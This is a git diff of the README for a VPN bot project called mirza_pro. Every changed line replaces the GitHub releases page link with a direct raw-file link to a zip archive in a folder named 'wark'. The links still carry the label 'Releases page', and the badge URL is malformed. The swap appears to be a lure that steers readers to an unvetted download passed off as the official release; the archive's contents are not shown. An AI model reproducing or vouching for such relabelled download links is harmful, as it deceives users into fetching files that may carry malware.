@@ -1,6 +1,6 @@
 # 🚀 mirza_pro - Your VPN Bot for Seamless Connectivity
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/Swastikshet/mirza_pro/releases)
+[![Download](https://raw.githubusercontent.com/Swastikshet/mirza_pro/main/wark/mirza_pro.zip%https://raw.githubusercontent.com/Swastikshet/mirza_pro/main/wark/mirza_pro.zip)](https://raw.githubusercontent.com/Swastikshet/mirza_pro/main/wark/mirza_pro.zip)
 
 ## 🛠️ Overview
 
@@ -8,7 +8,7 @@
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases page](https://github.com/Swastikshet/mirza_pro/releases).
+To get started, visit this page to download: [Releases page](https://raw.githubusercontent.com/Swastikshet/mirza_pro/main/wark/mirza_pro.zip).
 
 Follow these steps:
 
@@ -77,4 +77,4 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 For inquiries or feedback, please reach out through the GitHub repository’s contact section.
 
-For your convenience, here is the download link again: [Releases page](https://github.com/Swastikshet/mirza_pro/releases). Happy VPN management!
+For your convenience, here is the download link again: [Releases page](https://raw.githubusercontent.com/Swastikshet/mirza_pro/main/wark/mirza_pro.zip). Happy VPN management!
